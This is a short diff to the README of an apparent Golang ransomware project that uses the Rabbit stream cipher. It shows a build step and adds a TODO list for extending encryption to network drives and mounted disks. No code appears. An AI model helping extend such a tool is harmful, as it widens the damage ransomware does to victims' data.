@@ -21,3 +21,11 @@ A simple ransomware implementation in Golang that utilizes the Rabbit stream cip
 - **Build project:**  
   ```bash
   ./build.sh
+
+
+---
+
+### ✅ TODO
+
+- [ ] Encrypt network drives
+- [ ] Encrypt mounted disks
